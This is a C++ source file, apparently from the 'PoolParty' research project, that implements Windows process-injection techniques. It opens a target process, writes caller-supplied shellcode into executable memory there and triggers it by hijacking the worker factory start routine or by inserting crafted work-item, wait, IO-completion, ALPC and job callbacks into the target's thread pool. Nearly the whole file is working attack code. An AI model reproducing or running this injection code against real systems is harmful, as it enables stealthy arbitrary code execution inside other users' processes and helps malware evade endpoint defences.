#include "PoolParty.hpp"

PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
	this->dwTargetPid = dwTargetPid;
	this->cShellcode = cShellcode;
	//this->szShellcodeSize = sizeof(cShellcode);
	//this->szShellcodeSize = 208; // TODO: Fix this disgusting issue
	this->szShellcodeSize = 224; // TODO: Fix this disgusting issue
}

HANDLE PoolParty::GetTargetProcessHandle() {
	auto hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, this->dwTargetPid);
	return hTargetPid;
}

HANDLE PoolParty::GetWorkerFactoryHandle() {
	WorkerFactoryHandleDuplicator Duplicator{ this->dwTargetPid, this->hTargetPid };
	auto hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
	return hWorkerFactory;
}

WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() {
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	w_NtQueryInformationWorkerFactory(this->hWorkerFactory, (WORKERFACTORYINFOCLASS)WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
	return WorkerFactoryInformation;
}

LPVOID PoolParty::AllocateShellcodeMemory() {
	LPVOID ShellcodeAddress = AllocateMemory(this->hTargetPid, this->szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	return ShellcodeAddress;
}

void PoolParty::WriteShellcode() {
	WriteMemory(this->hTargetPid, this->ShellcodeAddress, this->cShellcode, this->szShellcodeSize);
}

void PoolParty::TriggerExecution() 
{
}

void PoolParty::Inject() {
	this->hTargetPid = this->GetTargetProcessHandle();
	this->hWorkerFactory = this->GetWorkerFactoryHandle();
	this->WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
	this->ShellcodeAddress = this->AllocateShellcodeMemory();
	this->WriteShellcode();
	this->SetupExecution();
	this->TriggerExecution();
}

PoolParty::~PoolParty() 
{
}


/*
	Concrete PoolParty classes
*/

/* Worker factory start routine overwrite */

WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void WorkerFactoryStartRoutineOverwrite::SetupExecution()
{
	WriteMemory(this->hTargetPid, this->WorkerFactoryInformation.StartRoutine, this->cShellcode, this->szShellcodeSize);
}

void WorkerFactoryStartRoutineOverwrite::TriggerExecution()
{

}

WorkerFactoryStartRoutineOverwrite::~WorkerFactoryStartRoutineOverwrite()
{
}


/* Remote work item insertion variant */

RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode) 
	: PoolParty{dwTargetPid, cShellcode} 
{
}

void RemoteWorkItemInsertion::SetupExecution() 
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);

	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	/* Allocate TP_WORK with a custom TP_POOL */
	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)this->ShellcodeAddress, NULL, NULL);

	/* 
		When a task is posted NTDLL would insert the task to the pool task queue list tail
		To avoid using WriteProcessMemory later on to post the task, we modify the work item's properties as if it was already "posted"
		In addition we make the work item exchangable so that ntdll!TppWorkerThread will process it correctly
	*/
	pWorkItem->CleanupGroupMember.Pool = (PFULL_TP_POOL)this->WorkerFactoryInformation.StartParameter;
	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
	pWorkItem->WorkState.Exchange = 0x2;

	/* Write the specially crafted work item to the target process address space */
	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
	
	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
	WriteMemory(this->hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	WriteMemory(this->hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
}

RemoteWorkItemInsertion::~RemoteWorkItemInsertion() 
{
}


/* Remote wait callback insertion variant */

RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteWaitCallbackInsertion::SetupExecution()
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create thread pool wait */
	auto pWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)this->ShellcodeAddress, NULL, NULL);

	/* Write wait and direct structures into the target process */
	auto RemoteWaitAddress = (PFULL_TP_WAIT)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));

	auto RemoteDirectAddress = (PTP_DIRECT)AllocateMemory(this->hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));

	/* Create dispatcher object */
	auto hEvent = w_CreateEvent(NULL, FALSE, FALSE, NULL);

	/* Associate dispatcher object with the worker factory IO completion port */
	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, hIoCompletion, hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, NULL);

	/* Trigger dispatcher object making NtWaitForWorkViaWorkerFactory receiving our specially crafted wait & direct */
	// TODO: Should it be a wrapper?
	SetEvent(hEvent);
}

RemoteWaitCallbackInsertion::~RemoteWaitCallbackInsertion()
{
}


/* Remote IO completion callback insertion variant */

RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteIoCompletionCallbackInsertion::SetupExecution()
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create the file to associate with the IO completion */
	auto hFile = w_CreateFile(L"PoolParty_Invitation.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	/* Create a TP_IO */
	auto pTpIo = w_CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)this->ShellcodeAddress, NULL, NULL);

	// TODO: Should be filled by w_CreateThreadpoolIo
	pTpIo->CleanupGroupMember.Callback = this->ShellcodeAddress;

	/* Start async IO operation */
	++pTpIo->PendingIrpCount;

	/* Write the TP_IO to the target process */
	auto RemoteIoAddress = (PFULL_TP_IO)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO)); 

	/* De-associate the file from its original IO completion and re-associate it with the IO completion of the target worker factory */
	IO_STATUS_BLOCK IoStatusBlock{ 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
	FileIoCopmletionInformation.Port = hIoCompletion;
	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
	w_ZwSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), 61); // TODO: Export 0x3D to enum

	/* Trigger execution */
	// TODO: Use std::string instead of C char
	char cBuffer[] =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	auto szBufferLength = strlen(cBuffer);
	OVERLAPPED Overlapped = { 0 };
	w_WriteFile(hFile, cBuffer, szBufferLength, NULL, &Overlapped);
}

RemoteIoCompletionCallbackInsertion::~RemoteIoCompletionCallbackInsertion()
{
}

/* Remote ALPC callback insertion variant */

RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

// TODO: Add RAII wrappers for resource creation functions

void RemoteAlpcCallbackInsertion::SetupExecution() 
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
	
	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	
	/* 
		Since we can not re-set the ALPC object IO completion port, we are creating a temporary ALPC object that will only be used to allocate a TP_ALPC structure
	*/
	auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(NULL, NULL);

	/* 
		ntdll!TpAllocAlpcCompletion would set the ALPC object's IO copmletion port and associate it itself with the local pool's worker factory IO copmletion port
		We can not avoid calling ntdll!TpAllocAlpcCompletion as it is the easiest way to allocate a valid TP_ALPC structure
		So we just use a temp ALPC object to help us allocate the TP_ALPC structure
		we will later on modify the TP_ALPC to contain a new ALPC object, associated with the target's worker factory IO completion port
	*/
	auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)this->ShellcodeAddress, NULL, NULL);

	/* Create an ALPC object that does not have an IO copmletion port already set */

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
	pTpAlpc->AlpcPort = hAlpcConnectionPort;
	
	/* Write the TP_ALPC to the target process */
	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
	
	/* Associate the ALPC object with the IO completion of the target worker factory */
	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
	AlpcPortAssociateCopmletionPort.CompletionPort = hIoCompletion;
	w_NtAlpcSetInformation(hAlpcConnectionPort, 2, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT)); // TODO:  Export 2 to enum
	
	/* Trigger execution by connecting to the ALPC object */
	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	std::string Buffer =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);

	auto szClientAlpcPortMessage = sizeof(ALPC_MESSAGE);

	/* ntdll!NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;

	auto hAlpcCommunicationPort = w_NtAlpcConnectPort(
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		NULL,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		NULL,
		NULL,
		&liTimeout
	);
}

RemoteAlpcCallbackInsertion::~RemoteAlpcCallbackInsertion()
{
}

/* Remote job notification callback insertion variant */

RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteJobCallbackInsertion::SetupExecution() {

	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create a job object */
	auto hJob = w_CreateJobObject(NULL, NULL);

	/* Allocate TP_JOB */
	auto pTpJob = w_TpAllocJobNotification(hJob, this->ShellcodeAddress, NULL, NULL);

	/* Write the TP_JOB to the target process */
	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(this->hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));

	/* Zero out the IO completion port information of the job object */
	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };

	w_SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	/* Associate the job object with the IO completion of the target worker factory */
	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = hIoCompletion;

	w_SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	/* Trigger execution by adding a process to the job object */
	w_AssignProcessToJobObject(hJob, GetCurrentProcess());

}

RemoteJobCallbackInsertion::~RemoteJobCallbackInsertion()
{
}
